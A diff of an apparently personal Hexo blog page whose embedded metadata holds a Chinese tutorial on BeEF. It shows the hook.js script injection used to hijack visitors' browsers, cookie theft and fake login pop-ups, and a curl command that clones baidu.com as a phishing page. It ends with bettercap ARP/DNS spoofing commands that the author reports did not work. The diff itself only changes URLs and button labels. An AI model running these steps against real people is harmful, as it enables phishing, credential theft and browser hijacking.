@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"基础配置先修改配置文件\n1/usr/share/beef-xss/config.yaml\n\n修改ip地址为kali的ip地址\n12345# HTTP serverhttp:    debug: false #Thin::Logging.debug, very verbose. Prints also full exception stack trace.    host: &quot;192.168.110.140&quot;    port: &quot;3000&quot;\n\n\n\n启动 \nbeef-xss\n我这里打不开浏览器 去浏览器里手动输入\n1http://192.168.110.140:3000/ui/panel\n\n默认账号密码beef beef\nbeef有两个默认的hook页面，\n123默认hook js：http://192.168.110.140:3000/hook.js默认hook页面： http://192.168.110.140:3000/demos/basic.html 　　//访问即可被hook\n\n里面主要有这么一段代码\n1234&lt;script&gt;\tvar commandModuleStr = '&lt;script src=\"' + window.location.protocol + '//' + window.location.host + '/hook.js\" type=\"text/javascript\"&gt;&lt;\\/script&gt;';\tdocument.write(commandModuleStr);&lt;/script&gt;\n\n测试\n12345&lt;html&gt;　　&lt;head&gt;　　　　&lt;script src=\"http://192.168.110.140:3000/hook.js\"&gt;&lt;/script&gt;　　&lt;/head&gt;&lt;/html&gt;\n\nbeef就会收到请求 并且钩住\n看一下beef界面的功能\n\n先看左边\n在线主机 和 不在线主机\n再看右边\nDeteils 浏览器信息详情，我看着就是请求头\nLogs 记录浏览器的操作，点击，输入都能记录\nCommands 重点模块，可以对浏览器执行的操作\ncommands模块又包括许多小模块\n\n12\n\nBrowser浏览器模块 里面还包括一个hook domain模块 可以\nget cookie \n替换&lt;a&gt;标签内的href值  \n重定向等等\n\nSocial Engineering社工模块\n\nPretty Theft 可以弹窗 让用户输入账号密码，右边的data 就是受害者的输入\n并且弹窗界面可以更改，\n1/usr/share/beef-xss/modules/social_engineering/pretty_theft/command.js\n\nMisc注入一个iframe\nMisc –&gt; Create Invisible Frame\n钓鱼网站这里要以./beef的形式启动beef 注意要切换到/usr/share/beef-xss目录\n123456789101112131415161718root@kali:/usr/share/beef-xss# ./beef[ 9:15:17][*] Bind socket [imapeudora1] listening on [192.168.110.140:2000].[ 9:15:17][*] Browser Exploitation Framework (BeEF) 0.4.7.0-alpha[ 9:15:17]    |   Twit: @beefproject[ 9:15:17]    |   Site: http://beefproject.com[ 9:15:17]    |   Blog: http://blog.beefproject.com[ 9:15:17]    |_  Wiki: https://github.com/beefproject/beef/wiki[ 9:15:17][*] Project Creator: Wade Alcorn (@WadeAlcorn)[ 9:15:17][*] BeEF is loading. Wait a few seconds...[ 9:15:20][*] 12 extensions enabled.[ 9:15:20][*] 254 modules enabled.[ 9:15:20][*] 1 network interfaces were detected.[ 9:15:20][+] running on network interface: 192.168.110.140[ 9:15:20]    |   Hook URL: http://192.168.110.140:3000/hook.js[ 9:15:20]    |_  UI URL:   http://192.168.110.140:3000/ui/panel[ 9:15:20][*] RESTful API key: 512ed45b87d468af3b72b338417d47c74e719aa5[ 9:15:20][*] HTTP Proxy: http://127.0.0.1:6789[ 9:15:20][*] BeEF server started (press control+c to stop)\n\n克隆一下网站\n12root@kali:/usr/share/beef-xss# curl -H \"Content-Type: application/json; charset=UTF-8\" -d '&#123;\"url\":\"https://www.baidu.com/\",\"mount\":\"/\"&#125;' -X POST http://192.168.110.140:3000/api/seng/clone_page?token=512ed45b87d468af3b72b338417d47c74e719aa5&#123;\"success\":true,\"mount\":\"/\"&#125;\n\n这样就把baidu克隆到了我们本地\n访问试试\n\n这样就把我们的网站伪造成了百度，并且只要别人以访问我伪造的页面，就会被我控制\n浏览器登陆一下 beef\n看到online 已上线\n伪造的页面中有这么一段代码\n1&lt;script type=\"text/javascript\" src=\"http://192.168.110.140:3000/hook.js\"&gt;&lt;/script&gt;\n\n这里应该就是会被控制的原因\n这里可以在结合DNS欺骗 将百度的网址解析到192.168.110.140上，这里要把3000端口改成80\n利用bettercap 进行DNS欺骗\nkali安装bettercap \n1apt install bettercap\n\n进行DNS欺骗\n1234567root@kali:~# bettercapbettercap v2.24.1 (built for linux amd64 with go1.11.6) [type 'help' for a list of commands]192.168.110.0/24 &gt; 192.168.110.140  » set arp.spoof.targets 192.168.110.1,192.168.110.140192.168.110.0/24 &gt; 192.168.110.140  » set arp.spoof.domains www.baidu.com192.168.110.0/24 &gt; 192.168.110.140  » set arp.spoof.address 192.168.110.140192.168.110.0/24 &gt; 192.168.110.140  » arp.spoof on\n\n没复现出来\n这里要注意beef一定得是新开启的 要不然会出现token不正确，认证错误\n可以使用service beef-xss stop 停止beef\n克隆的网站在\n12root@kali:/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages# lsreadme.txt  www.baidu.com  www.baidu.com_mod\n\n参考链接\nhttps://blog.csdn.net/qq_36119192/article/details/84582109#%E7%BB%93%E5%90%88Beef-XSS\nhttps://blog.csdn.net/qq_36119192/article/details/82731839\n","dateCreated":"2019-10-09T08:26:32+08:00","dateModified":"2020-02-26T14:43:27+08:00","datePublished":"2019-10-09T08:26:32+08:00","description":"基础配置先修改配置文件\n1/usr/share/beef-xss/config.yaml\n\n修改ip地址为kali的ip地址\n12345# HTTP serverhttp:    debug: false #Thin::Logging.debug, very verbose. Prints also full exception stack trace.    host: &quot;192.168.110.140&quot;    port: &quot;3000&quot;","headline":"beef简单的使用","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/10/09/beef简单的使用/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/10/09/beef简单的使用/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"基础配置先修改配置文件\n1/usr/share/beef-xss/config.yaml\n\n修改ip地址为kali的ip地址\n12345# HTTP serverhttp:    debug: false #Thin::Logging.debug, very verbose. Prints also full exception stack trace.    host: &quot;192.168.110.140&quot;    port: &quot;3000&quot;\n\n\n\n启动 \nbeef-xss\n我这里打不开浏览器 去浏览器里手动输入\n1http://192.168.110.140:3000/ui/panel\n\n默认账号密码beef beef\nbeef有两个默认的hook页面，\n123默认hook js：http://192.168.110.140:3000/hook.js默认hook页面： http://192.168.110.140:3000/demos/basic.html 　　//访问即可被hook\n\n里面主要有这么一段代码\n1234&lt;script&gt;\tvar commandModuleStr = '&lt;script src=\"' + window.location.protocol + '//' + window.location.host + '/hook.js\" type=\"text/javascript\"&gt;&lt;\\/script&gt;';\tdocument.write(commandModuleStr);&lt;/script&gt;\n\n测试\n12345&lt;html&gt;　　&lt;head&gt;　　　　&lt;script src=\"http://192.168.110.140:3000/hook.js\"&gt;&lt;/script&gt;　　&lt;/head&gt;&lt;/html&gt;\n\nbeef就会收到请求 并且钩住\n看一下beef界面的功能\n\n先看左边\n在线主机 和 不在线主机\n再看右边\nDeteils 浏览器信息详情，我看着就是请求头\nLogs 记录浏览器的操作，点击，输入都能记录\nCommands 重点模块，可以对浏览器执行的操作\ncommands模块又包括许多小模块\n\n12\n\nBrowser浏览器模块 里面还包括一个hook domain模块 可以\nget cookie \n替换&lt;a&gt;标签内的href值  \n重定向等等\n\nSocial Engineering社工模块\n\nPretty Theft 可以弹窗 让用户输入账号密码，右边的data 就是受害者的输入\n并且弹窗界面可以更改，\n1/usr/share/beef-xss/modules/social_engineering/pretty_theft/command.js\n\nMisc注入一个iframe\nMisc –&gt; Create Invisible Frame\n钓鱼网站这里要以./beef的形式启动beef 注意要切换到/usr/share/beef-xss目录\n123456789101112131415161718root@kali:/usr/share/beef-xss# ./beef[ 9:15:17][*] Bind socket [imapeudora1] listening on [192.168.110.140:2000].[ 9:15:17][*] Browser Exploitation Framework (BeEF) 0.4.7.0-alpha[ 9:15:17]    |   Twit: @beefproject[ 9:15:17]    |   Site: http://beefproject.com[ 9:15:17]    |   Blog: http://blog.beefproject.com[ 9:15:17]    |_  Wiki: https://github.com/beefproject/beef/wiki[ 9:15:17][*] Project Creator: Wade Alcorn (@WadeAlcorn)[ 9:15:17][*] BeEF is loading. Wait a few seconds...[ 9:15:20][*] 12 extensions enabled.[ 9:15:20][*] 254 modules enabled.[ 9:15:20][*] 1 network interfaces were detected.[ 9:15:20][+] running on network interface: 192.168.110.140[ 9:15:20]    |   Hook URL: http://192.168.110.140:3000/hook.js[ 9:15:20]    |_  UI URL:   http://192.168.110.140:3000/ui/panel[ 9:15:20][*] RESTful API key: 512ed45b87d468af3b72b338417d47c74e719aa5[ 9:15:20][*] HTTP Proxy: http://127.0.0.1:6789[ 9:15:20][*] BeEF server started (press control+c to stop)\n\n克隆一下网站\n12root@kali:/usr/share/beef-xss# curl -H \"Content-Type: application/json; charset=UTF-8\" -d '&#123;\"url\":\"https://www.baidu.com/\",\"mount\":\"/\"&#125;' -X POST http://192.168.110.140:3000/api/seng/clone_page?token=512ed45b87d468af3b72b338417d47c74e719aa5&#123;\"success\":true,\"mount\":\"/\"&#125;\n\n这样就把baidu克隆到了我们本地\n访问试试\n\n这样就把我们的网站伪造成了百度，并且只要别人以访问我伪造的页面，就会被我控制\n浏览器登陆一下 beef\n看到online 已上线\n伪造的页面中有这么一段代码\n1&lt;script type=\"text/javascript\" src=\"http://192.168.110.140:3000/hook.js\"&gt;&lt;/script&gt;\n\n这里应该就是会被控制的原因\n这里可以在结合DNS欺骗 将百度的网址解析到192.168.110.140上，这里要把3000端口改成80\n利用bettercap 进行DNS欺骗\nkali安装bettercap \n1apt install bettercap\n\n进行DNS欺骗\n1234567root@kali:~# bettercapbettercap v2.24.1 (built for linux amd64 with go1.11.6) [type 'help' for a list of commands]192.168.110.0/24 &gt; 192.168.110.140  » set arp.spoof.targets 192.168.110.1,192.168.110.140192.168.110.0/24 &gt; 192.168.110.140  » set arp.spoof.domains www.baidu.com192.168.110.0/24 &gt; 192.168.110.140  » set arp.spoof.address 192.168.110.140192.168.110.0/24 &gt; 192.168.110.140  » arp.spoof on\n\n没复现出来\n这里要注意beef一定得是新开启的 要不然会出现token不正确，认证错误\n可以使用service beef-xss stop 停止beef\n克隆的网站在\n12root@kali:/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages# lsreadme.txt  www.baidu.com  www.baidu.com_mod\n\n参考链接\nhttps://blog.csdn.net/qq_36119192/article/details/84582109#%E7%BB%93%E5%90%88Beef-XSS\nhttps://blog.csdn.net/qq_36119192/article/details/82731839\n","dateCreated":"2019-10-09T08:26:32+08:00","dateModified":"2020-02-26T14:43:27+08:00","datePublished":"2019-10-09T08:26:32+08:00","description":"基础配置先修改配置文件\n1/usr/share/beef-xss/config.yaml\n\n修改ip地址为kali的ip地址\n12345# HTTP serverhttp:    debug: false #Thin::Logging.debug, very verbose. Prints also full exception stack trace.    host: &quot;192.168.110.140&quot;    port: &quot;3000&quot;","headline":"beef简单的使用","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/10/09/beef简单的使用/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/10/09/beef简单的使用/"}</script>
     <meta name="description" content="基础配置先修改配置文件 1/usr/share/beef-xss/config.yaml  修改ip地址为kali的ip地址 12345# HTTP serverhttp:    debug: false #Thin::Logging.debug, very verbose. Prints also full exception stack trace.    host: &amp;quot;192.16">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="beef简单的使用">
-<meta property="og:url" content="http://yoursite.com/2019/10/09/beef简单的使用/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/10/09/beef简单的使用/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="基础配置先修改配置文件 1/usr/share/beef-xss/config.yaml  修改ip地址为kali的ip地址 12345# HTTP serverhttp:    debug: false #Thin::Logging.debug, very verbose. Prints also full exception stack trace.    host: &amp;quot;192.16">
 <meta property="og:locale" content="zh-cn">
@@ -338,7 +338,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -349,7 +349,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/09/beef简单的使用/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/09/beef简单的使用/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -362,7 +362,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/09/beef简单的使用/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/09/beef简单的使用/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -375,7 +375,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/09/beef简单的使用/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/09/beef简单的使用/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -388,7 +388,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -453,7 +453,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -464,7 +464,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/09/beef简单的使用/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/09/beef简单的使用/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -477,7 +477,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/09/beef简单的使用/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/09/beef简单的使用/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -490,7 +490,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/09/beef简单的使用/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/09/beef简单的使用/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -503,7 +503,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -524,7 +524,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/09/beef简单的使用/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/09/beef简单的使用/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -537,7 +537,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/09/beef简单的使用/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/09/beef简单的使用/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -550,7 +550,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/10/09/beef简单的使用/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/09/beef简单的使用/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
